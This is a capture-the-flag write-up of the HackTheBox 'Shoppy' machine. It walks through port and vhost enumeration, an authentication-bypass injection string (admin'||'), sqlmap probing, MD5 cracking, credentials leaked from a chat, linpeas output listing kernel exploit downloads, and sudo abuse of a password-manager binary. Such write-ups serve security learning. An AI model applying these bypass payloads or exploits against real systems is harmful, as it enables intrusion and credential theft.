# Shoppy WIP
## Start: 27/10/2022

### IP: 10.10.11.180

So first, nmap, scan is below
```
$nmap -sV -sC 10.10.11.180 -Pn 
Nmap scan report for 10.10.11.180
Host is up (0.035s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
80/tcp open  http    nginx 1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
|_http-server-header: nginx/1.23.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
pop shoppy.htb into host file and away we go using burp to the website, where we're met by a waiting page followed by a redirect to the main page:
![Picture of wait page](https://github.com/e-war/Writeups/blob/master/HackTheBox/Shoppy/Screenshots/1Shoppy_Wait.png)
![Picture of main page](https://github.com/e-war/Writeups/blob/master/HackTheBox/Shoppy/Screenshots/2Shoppy_main.png)
Ok, a boring countdown, are there any interesting scripts? 
```
<script src="js/jquery.js"></script>
<script src="js/plugins.js"></script>
<script src="js/jquery.countdown.min.js"></script>
<script src="js/main.js"></script>

```
Nothing really stands out when viewing these however so next bit of info gathering is testing out if there are some hidden directories we can search for, typically i use gobuster for this

```
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shoppy.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/elliot/Programs/Security/SecLists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   404
[+] Exclude Length:          169
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/28 20:10:50 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 302) [Size: 28] [--> /login]
/images               (Status: 301) [Size: 179] [--> /images/]
/login                (Status: 200) [Size: 1074]              
/js                   (Status: 301) [Size: 171] [--> /js/]    
/css                  (Status: 301) [Size: 173] [--> /css/]   
/assets               (Status: 301) [Size: 179] [--> /assets/]
/Admin                (Status: 302) [Size: 28] [--> /login]   
/Login                (Status: 200) [Size: 1074]              
/fonts                (Status: 301) [Size: 177] [--> /fonts/] 
/ADMIN                (Status: 302) [Size: 28] [--> /login]   
/exports              (Status: 301) [Size: 181] [--> /exports/]
/LogIn                (Status: 200) [Size: 1074]               
/LOGIN                (Status: 200) [Size: 1074]               
                                                               
===============================================================
2022/10/28 20:14:13 Finished
===============================================================
```
Well would you look at that, an /admin which redirects to the /login page and an /exports page too, although this only redirects to a path which cant be fetched..
Lets take a look at that admin page anyway
![Picture of admin login page](https://github.com/e-war/Writeups/blob/master/HackTheBox/Shoppy/Screenshots/3Shoppy_admin.png)
admin:admin is probably too good to hope for, but looks like if we put a quote mark in the page it times out! This is a decent chance of being the result of breaking some database query which looks up the account and password, this could mean that with correct symbol placement we could modify the query and allow any password to be accepted for any user account.

So the steps being:
    -   Determine database using specific inputs
    -   Determine database query
    -   Craft breakout string


i can't be sure as we can't really get a response from the server aside from the timeout error we recieve when the sql query breaks.

![SQL 1](https://github.com/e-war/Writeups/blob/master/HackTheBox/Shoppy/Screenshots/4Shoppy_SQL1.png)

![SQL 2](https://github.com/e-war/Writeups/blob/master/HackTheBox/Shoppy/Screenshots/5Shoppy_SQL2.png)


`admin'&&'` includes quote marks returns the normal "wrong credentials" error which means that the system is reading this as valid sql.

A database query for sql might look like
`'WHERE user.username == "" && user.password == ""'`

So by entering a command such as the one below:
`admin'||'`

Would result in `'WHERE user.username == admin'||' && user.password == ""'`
Which means where username == admin OR (&& password == password), which removes the password from being a neccessary element as we only need the username or the password.

So lets give that a try...
![Crafted String](https://github.com/e-war/Writeups/blob/master/HackTheBox/Shoppy/Screenshots/6Shoppy_Crafted.png)

![Login Bypassed](https://github.com/e-war/Writeups/blob/master/HackTheBox/Shoppy/Screenshots/7Shoppy_admin_bypass.png)
Bingo

So what does this admin page offer us? An ability to search for a user and retrieve a json object which includes the ID, name, and a hashed password...
![Search for admin user](https://github.com/e-war/Writeups/blob/master/HackTheBox/Shoppy/Screenshots/8Shoppy_Search_user.png)
![Search for admin user 2](https://github.com/e-war/Writeups/blob/master/HackTheBox/Shoppy/Screenshots/9Shoppy_admin_results.png)

While i did initally try sqlmap on the previous sql injection site (which didn't work due to the timeout each time the sql failed), i believe we may have a better chance of running it against this internal admin search as we actually recieve an error message when the sql breaks (which it still can when including a quote mark)

![sqlmap](https://github.com/e-war/Writeups/blob/master/HackTheBox/Shoppy/Screenshots/10sqlmap.png)
And while running sqlmap i refreshed the results page, and it seems one of the sqlmap probe requests has triggered all items to be read onto screen!
![shoppy all results](https://github.com/e-war/Writeups/blob/master/HackTheBox/Shoppy/Screenshots/11Shoppy_all_results.png)

So we have a new user to look into, Josh, the passwords here look like md5 encrypted hashes which is good as they are simply cracked, and even most online rainbow tables make short work of hashes, putting the admin password into these tables doesn't really give much but josh's password seems to be easily gotten:

![MD5 Decrypt](https://github.com/e-war/Writeups/blob/master/HackTheBox/Shoppy/Screenshots/12MD5_decrypt.png)

Josh: remembermethisway

Unfortunately josh doesn't have any extra permissions on this site above admin, nor does this password work for an ssh connection.. So maybe I'm missing something on this site, while nmap does give a good idea of what servers are running, it only tells us about the default web server and doesn't give any DNS or VHOST information, so i chose to run gobuster again, instead using the VHOST command to see if there are some subdomains that i might've missed..
```
gobuster vhost -u shoppy.htb -w ~/Programs/Security/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt                                                                                                              
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://shoppy.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /home/elliot/Programs/Security/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/11/05 13:05:48 Starting gobuster in VHOST enumeration mode
===============================================================
Found: mattermost.shoppy.htb (Status: 200) [Size: 3122]
                                                       
===============================================================
2022/11/05 13:11:01 Finished

```

So i did miss something, so it might be a good idea to perform a dns enumeration just after finding the webserver in nmap next time
So going to mattermost.shoppy.htb we see a mattermost page, a internal messaging system like slack it looks like, might as well try the credentials we found earlier for josh..

![Mattermost login](https://github.com/e-war/Writeups/blob/master/HackTheBox/Shoppy/Screenshots/13Mattermost_login.png)

![Mattermost logged in](https://github.com/e-war/Writeups/blob/master/HackTheBox/Shoppy/Screenshots/14Mattermost_loggedin.png)

Excellent, we have gained access to the internal chat system, there looks to be a few rooms for chats, but in the "Deploy machine" chat we see more credentials leaked:
jaeger: Sh0ppyBest@pp!

![Mattermost login creds](https://github.com/e-war/Writeups/blob/master/HackTheBox/Shoppy/Screenshots/15Mattermost_login_creds.png)

they're discussing deployment on a machine, which might be the server we're looking at breaking into so its possible these credentials could work on the SSH connection, lets give that a try..


![SSH Login](https://github.com/e-war/Writeups/blob/master/HackTheBox/Shoppy/Screenshots/16SSH_Login.png)

### User access obtained

So aside from grabbing the user.txt from the users (jaeger)'s home directory which i'll let you do yourselves 
I'm gonna start as usual by downloading linpeas, which i've included in this directory seperately.

#### Exploitation shortlist

```
╔══════════╣ CVEs Check
Potentially Vulnerable to CVE-2022-0847

Potentially Vulnerable to CVE-2022-2588


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/home/jaeger/.nvm/versions/node/v18.6.0/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
New path exported: /home/jaeger/.nvm/versions/node/v18.6.0/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/sbin:/usr/sbin:/sbin

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2021-3490] eBPF ALU32 bounds tracking for bitwise ops

   Details: https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story
   Exposure: probable
   Tags: ubuntu=20.04{kernel:5.8.0-(25|26|27|28|29|30|31|32|33|34|35|36|37|38|39|40|41|42|43|44|45|46|47|48|49|50|51|52)-*},ubuntu=21.04{kernel:5.11.0-16-*}
   Download URL: https://codeload.github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490/zip/main
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: probable
   Tags: ubuntu=(20.04|21.04),[ debian=11 ]
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,[ debian=7|8|9|10|11 ],fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager

╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
/usr/bin/dockerd-rootless.sh
/usr/bin/gettext.sh
/usr/bin/dockerd-rootless-setuptool.sh


╔══════════╣ Files inside others home (limit 20)
/home/deploy/.bash_logout
/home/deploy/password-manager
/home/deploy/creds.txt
/home/deploy/.bashrc
/home/deploy/.profile
/home/deploy/password-manager.cpp
/var/www/html/index.nginx-debian.html
/var/lib/postgresql/.psql_history
```
Being able to run a file as a different user is always interesting, so we might as well see what the program does 
```
cat /home/deploy/password-manager
ELF> @H@@8
          @@@@h���`
                   `
                    ��   ���-�=�=�P�-�=����DDP�td� � � LLQ�tdR�td�-�=�=PP/lib64/ld-linux-x86-64.so.2GNU@
)�GNU�▒�e�ms��                                                                                          .�Ҵ��43H
              C-�����fFr�S�w �� , N�"�▒�A▒#▒�@__gmon_start___ITM_deregisterTMCloneTable_ITM_registerTMCloneTable_ZNSaIcED1Ev_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1Ev_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ZSt3cin_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1EPKcRKS3__ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEpLEPKc_ZNSt8ios_base4InitD1Ev_ZNSolsEPFRSoS_E__gxx_personality_v0_ZNSaIcEC1Ev_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc_ZNSt8ios_base4InitC1Ev_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev_ZSt4cout_ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE7compareERKS4__ZStrsIcSt11char_traitsIcESaIcEERSt13basic_istreamIT_T0_ES7_RNSt7__cxx1112basic_stringIS4_S5_T1_EE_Unwind_Resume__cxa_atexitsystem__cxa_finalize__libc_start_mainlibstdc++.so.6libgcc_s.so.1libc.so.6GCC_3.0GLIBC_2.2.5CXXABI_1.3GLIBCXX_3.4GLIBCXX_3.4.21( P&y
                                                                                                                                                                                                        @6 u▒i  HӯkTt)_q��k��4����@�?�?�?�?�?�?�?�@�@▒�A▒@ @(@0@8@@@HP@     X@
`@
  h@
x@�@H�H��/H��t��H���5�/�%�/@�%�/h������%�/h������%�/h������%�/h������%�/h������%�/h������%�/h������%�/h�p����%�/�`����%�/h      �P����%�/h
�@����%�/h
          �0����%�/h
H�=���.�DH�=I/H�B/H9�tH�n.H��t  �����H�=/H�5/H)�H��H��?H��H�H��tH�E.H����fD���=11u/UH�=�-H��t
���H��H�S,H��H������H�E�H�������H�E�H����������<H��H�E�H��������H��H�E�H���w����H��H�E�H���f���H��H�����h����   1]�����{���UH��SH��XH�5�
                                                                                                      ���H�]���UH��H���}��u��}�u2�}���u)H�=�.�����H�u,H�5�.H��+H���/������UH�����������]��AWL�=W)AVI��AUI��ATA��UH�-P)SL)�H������H��t�L��L��D��A��H��H9�u�H�[]A\A]A^A_��H�H��Welcome to Josh password manager!Please enter your master password: S******eAccess granted! Here is creds !cat /home/deploy/creds.txtAccess denied! This incident will be reported !@����0����@���h%����
                                                                                                                                                                                                                                       ��� T���@p���`�����zRx
                Rx
                 ▒J
                   �?▒;*3$"Dh��zPLRx��
E��                                  �C
D �����IA�C
�
P���A�C
D���]B�I▒�E �E(�D0�H8�G@j8A0A(B B▒B, ������������4�(6
��=▒�����8
z
 ▒@P
    �  P        ▒������o@       ���o���o
        ���o�=6FVfv���������@GCC: (Debian 10.2.1-6) 10.2.1 20210110��8�
       @                �



 � � 0!�"�=�=�=�?▒@�@▒�@
                        ▒�BC�=jv�=��� �▒�B��I4��▒�"��&� 
                                                        9�=B�=S�=f▒@|��@� �@� �"�H�@U�!������� +1u���@�)▒�@?��@N▒C��▒�@�P]%E ax���▒�A▒�� � �crtstuff.cderegister_tm_clones__do_global_dtors_auxcompleted.0__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entrypassword-manager.cpp_ZStL19piecewise_construct_ZStL8__ioinit_Z41__static_initialization_and_destruction_0ii_GLOBAL__sub_I_main__FRAME_END____GNU_EH_FRAME_HDR_DYNAMIC__init_array_end__init_array_start_GLOBAL_OFFSET_TABLE__ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE7compareERKS4_@GLIBCXX_3.4.21_edata_IO_stdin_used__cxa_finalize@GLIBC_2.2.5_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@GLIBCXX_3.4__dso_handle_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev@GLIBCXX_3.4.21DW.ref.__gxx_personality_v0system@GLIBC_2.2.5__cxa_atexit@GLIBC_2.2.5_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEpLEPKc@GLIBCXX_3.4.21_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@GLIBCXX_3.4_ZNSolsEPFRSoS_E@GLIBCXX_3.4_ZNSaIcED1Ev@GLIBCXX_3.4__TMC_END___ZStrsIcSt11char_traitsIcESaIcEERSt13basic_istreamIT_T0_ES7_RNSt7__cxx1112basic_stringIS4_S5_T1_EE@GLIBCXX_3.4.21_ZSt4cout@GLIBCXX_3.4_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1EPKcRKS3_@GLIBCXX_3.4.21__data_start_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1Ev@GLIBCXX_3.4.21__bss_start_ZNSt8ios_base4InitC1Ev@GLIBCXX_3.4__libc_csu_init__gxx_personality_v0@CXXABI_1.3_ITM_deregisterTMCloneTable_Unwind_Resume@GCC_3.0_ZNSaIcEC1Ev@GLIBCXX_3.4__libc_csu_fini_ZSt3cin@GLIBCXX_3.4__libc_start_main@GLIBC_2.2.5__gmon_start___ITM_registerTMCloneTable_ZNSt8ios_base4InitD1Ev@GLIBCXX_3.4.symtab.strtab.shstrtab.interp.note.gnu.build-id.note.ABI-tag.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.gcc_except_table.init_array.fini_array.dynamic.got.plt.data.bss.comment�� D��No

```
While this looks terrible, catting the program actually gives us more information than strings, in this cas we can see the password used in this file gets leaked (although i've censored it)

```
jaeger@shoppy:/tmp$ sudo --user=deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: S******e
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: D********!
```
And with that we have another user's credentials!